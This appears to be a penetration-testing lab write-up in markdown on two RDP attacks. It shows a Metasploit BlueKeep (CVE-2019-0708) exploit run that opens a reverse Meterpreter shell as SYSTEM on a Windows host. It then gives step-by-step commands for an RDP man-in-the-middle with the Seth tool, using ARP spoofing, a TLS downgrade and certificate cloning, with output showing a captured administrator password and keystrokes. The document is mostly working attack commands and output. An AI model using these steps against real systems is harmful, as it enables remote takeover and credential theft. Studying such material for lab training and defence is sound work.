# Bluekeep RCE vulnerability on windows 7 and Windows Server 2008 R2
```
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 1
target => 1
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 20.20.20.129:9000 
[*] 20.20.20.136:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 20.20.20.136:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 20.20.20.136:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 20.20.20.136:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 20.20.20.136:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 20.20.20.136:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.
[!] 20.20.20.136:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 20.20.20.136:3389 - Surfing channels ...
[*] 20.20.20.136:3389 - Lobbing eggs ...
[*] 20.20.20.136:3389 - Forcing the USE of FREE'd object ...
[!] 20.20.20.136:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Sending stage (200774 bytes) to 20.20.20.136
[*] Meterpreter session 1 opened (20.20.20.129:9000 -> 20.20.20.136:49157) at 2022-07-18 10:48:20 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

# RDP MitM using `Seth`

## Step #1: clone repo from github
```bash
git clone https://github.com/SySS-Research/Seth.git
```

## Step #2: make sure you set your pyenc to python 3.8.10
```bash
pyenv install 3.8.10
pyenv global 3.8.10
```

## Step #3: change to the repo directory and install the requirements using pip
```bash
cd seth
pip install -r requirements.txt
```

## Step #4: edit your `/etc/ssl/openssl.cnf` to enable TLS 1.0 as the minimum protocol like below
```
[system_default_sect]
MinProtocol = TLSv1.0
```

## Step #5: as root, run the bash script `seth.sh` with the syntax of:
```bash
./seth.sh <INTERFACE> <ATTACKER_IP> <RDP_CLIENT_MACHINE_IP> <RDP_TARGET_MACHINE_IP>
```
*In our case below:*
- our kali is **.129**
- the rdp client is **.130**
- the targt rdp host is **.50**

### Output:
```
└─# ./seth.sh eth0 20.20.20.129 20.20.20.130 20.20.20.50
███████╗███████╗████████╗██╗  ██╗
██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
███████║███████╗   ██║   ██║  ██║   https://www.syss.de
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
[*] Linux OS detected, using iptables as the netfilter interpreter
[*] Spoofing arp replies...
[*] Turning on IP forwarding...
[*] Set iptables rules for SYN packets...
[*] Waiting for a SYN packet to the original destination...
[+] Got it! Original destination is 20.20.20.50
[*] Clone the x509 certificate of the original destination...
[*] Adjust iptables rules for all packets...
[*] Run RDP proxy...
Listening for new connection
Connection received from 20.20.20.130:49767
Warning: RC4 not available on client, attack might not work
Downgrading authentication options from 11 to 3
Listening for new connection
Enable SSL
Connection lost ([Errno 104] Connection reset by peer)
Connection received from 20.20.20.130:49772
Warning: RC4 not available on client, attack might not work
Listening for new connection
Enable SSL
Connection lost ([Errno 104] Connection reset by peer)
Connection received from 20.20.20.130:49773
Warning: RC4 not available on client, attack might not work
Listening for new connection
Enable SSL
Keyboard Layout not recognized
Hiding forged protocol request from client
lab\administrator:Abc123!!
Key press:   5
Key press:   T
```